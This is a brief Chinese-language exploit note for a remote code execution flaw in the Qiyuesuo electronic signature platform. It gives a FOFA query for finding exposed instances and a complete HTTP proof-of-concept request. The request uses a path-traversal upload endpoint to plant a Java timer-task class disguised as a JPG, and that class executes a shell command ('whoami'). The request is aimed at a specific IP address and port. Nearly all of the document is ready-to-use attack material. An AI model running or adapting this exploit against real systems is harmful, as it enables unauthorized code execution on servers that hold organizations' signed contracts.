## 契约锁电子签章系统RCE

## fofa

```
app="契约锁-电子签署平台"
```

## poc

```
POST /callback/%2E%2E;/code/upload HTTP/1.1
Host: 103.242.174.137:9180
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Origin: https://103.242.174.137:9180
Referer: https://103.242.174.137:9180
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Connection: close

------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="type";

TIMETASK
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="file";filename="qys.jpg"

package qiyuesuo;

import com.qiyuesuo.utask.java.BaseTimerTask;

public class qiyuesuo004 extends BaseTimerTask {
    static {try{Runtime.getRuntime().exec("whoami");}catch (Exception e){}}
}
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--
```
